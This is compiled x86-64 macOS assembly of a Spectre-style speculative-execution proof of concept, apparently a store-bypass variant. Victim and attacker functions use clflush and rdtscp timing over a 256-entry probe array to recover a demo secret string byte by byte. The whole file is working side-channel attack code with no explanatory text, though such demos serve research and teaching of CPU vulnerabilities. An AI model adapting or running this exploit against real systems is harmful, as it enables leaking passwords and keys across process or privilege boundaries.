	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:                       ## @victim_function
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	leaq	_public_key(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	movzbl	(%rax,%rcx), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	(%rax,%rcx), %al
	movb	%al, _tmp(%rip)
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3, 0x0                          ## -- Begin function attacker_function
LCPI1_0:
	.quad	0x40c3880000000000              ## double 1.0E+4
LCPI1_1:
	.quad	0x4059000000000000              ## double 100
	.section	__TEXT,__text,regular,pure_instructions
	.globl	_attacker_function
	.p2align	4, 0x90
_attacker_function:                     ## @attacker_function
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1152, %rsp                     ## imm = 0x480
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	leaq	-32(%rbp), %rdi
	xorl	%esi, %esi
	movl	$17, %edx
	callq	_memset
	movl	$0, -1076(%rbp)
LBB1_1:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_3 Depth 2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
                                        ##     Child Loop BB1_18 Depth 2
	cmpl	$16, -1076(%rbp)
	jge	LBB1_26
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-1056(%rbp), %rdi
	xorl	%esi, %esi
	movl	$1024, %edx                     ## imm = 0x400
	callq	_memset
	movl	$0, -1080(%rbp)
	movl	$0, -1084(%rbp)
LBB1_3:                                 ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
	cmpl	$10000, -1084(%rbp)             ## imm = 0x2710
	jge	LBB1_17
## %bb.4:                               ##   in Loop: Header=BB1_3 Depth=2
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	_memory_slot@GOTPCREL(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	leaq	_secret_key(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	clflush	(%rax)
	movl	$0, -1088(%rbp)
LBB1_5:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1088(%rbp)               ## imm = 0x100
	jge	LBB1_8
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.7:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1088(%rbp)
	jmp	LBB1_5
LBB1_8:                                 ##   in Loop: Header=BB1_3 Depth=2
	mfence
	movslq	-1076(%rbp), %rdi
	callq	_victim_function
	movl	$0, -1092(%rbp)
LBB1_9:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1092(%rbp)               ## imm = 0x100
	jge	LBB1_15
## %bb.10:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1104(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1064(%rbp)
	movq	-1064(%rbp), %rax
	movq	%rax, -1144(%rbp)               ## 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1144(%rbp), %rcx               ## 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -1112(%rbp)
	movq	-1104(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -1080(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1072(%rbp)
	movq	-1072(%rbp), %rax
	movq	%rax, -1136(%rbp)               ## 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1136(%rbp), %rcx               ## 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-1112(%rbp), %rax
	movq	%rax, -1120(%rbp)
	cmpq	$100, -1120(%rbp)
	ja	LBB1_13
## %bb.11:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	movslq	-1076(%rbp), %rdx
	leaq	_public_key(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
	cmpl	%ecx, %eax
	je	LBB1_13
## %bb.12:                              ##   in Loop: Header=BB1_9 Depth=3
	movslq	-1092(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1056(%rbp,%rax,4)
LBB1_13:                                ##   in Loop: Header=BB1_9 Depth=3
	jmp	LBB1_14
LBB1_14:                                ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1092(%rbp)
	jmp	LBB1_9
LBB1_15:                                ##   in Loop: Header=BB1_3 Depth=2
	jmp	LBB1_16
LBB1_16:                                ##   in Loop: Header=BB1_3 Depth=2
	movl	-1084(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1084(%rbp)
	jmp	LBB1_3
LBB1_17:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1080(%rbp), %ecx
	movb	_tmp(%rip), %al
	movzbl	%al, %eax
	xorl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _tmp(%rip)
	movl	$-1, -1124(%rbp)
	movl	$0, -1128(%rbp)
LBB1_18:                                ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1128(%rbp)               ## imm = 0x100
	jge	LBB1_24
## %bb.19:                              ##   in Loop: Header=BB1_18 Depth=2
	cmpl	$0, -1124(%rbp)
	jl	LBB1_21
## %bb.20:                              ##   in Loop: Header=BB1_18 Depth=2
	movslq	-1124(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %eax
	movslq	-1128(%rbp), %rcx
	cmpl	-1056(%rbp,%rcx,4), %eax
	jge	LBB1_22
LBB1_21:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	movl	%eax, -1124(%rbp)
LBB1_22:                                ##   in Loop: Header=BB1_18 Depth=2
	jmp	LBB1_23
LBB1_23:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1128(%rbp)
	jmp	LBB1_18
LBB1_24:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %esi
	movl	-1124(%rbp), %edx
	movslq	-1124(%rbp), %rax
	cvtsi2sdl	-1056(%rbp,%rax,4), %xmm0
	movsd	LCPI1_1(%rip), %xmm1            ## xmm1 = [1.0E+2,0.0E+0]
	mulsd	%xmm1, %xmm0
	movsd	LCPI1_0(%rip), %xmm1            ## xmm1 = [1.0E+4,0.0E+0]
	divsd	%xmm1, %xmm0
	leaq	L_.str(%rip), %rdi
	movb	$1, %al
	callq	_printf
	movl	-1124(%rbp), %eax
	movb	%al, %cl
	movslq	-1076(%rbp), %rax
	movb	%cl, -32(%rbp,%rax)
## %bb.25:                              ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB1_1
LBB1_26:
	leaq	-32(%rbp), %rsi
	leaq	L_.str.1(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB1_28
## %bb.27:
	addq	$1152, %rsp                     ## imm = 0x480
	popq	%rbp
	retq
LBB1_28:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	movl	$0, -8(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	movslq	-8(%rbp), %rax
	cmpq	$1048576, %rax                  ## imm = 0x100000
	jae	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-8(%rbp), %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-8(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -8(%rbp)
	jmp	LBB2_1
LBB2_4:
	callq	_attacker_function
	movl	-4(%rbp), %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_secret_key                     ## @secret_key
	.p2align	4, 0x0
_secret_key:
	.asciz	"PASSWORD_SPECTRE"

	.globl	_public_key                     ## @public_key
	.p2align	4, 0x0
_public_key:
	.asciz	"################"

	.globl	_tmp                            ## @tmp
.zerofill __DATA,__common,_tmp,1,0
	.comm	_memory_slot_ptr,2048,4         ## @memory_slot_ptr
	.comm	_probe,1048576,4                ## @probe
	.comm	_memory_slot,2048,4             ## @memory_slot
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"idx:%2d, highest:%c, hitrate:%f\n"

L_.str.1:                               ## @.str.1
	.asciz	"%s\n"

.subsections_via_symbols
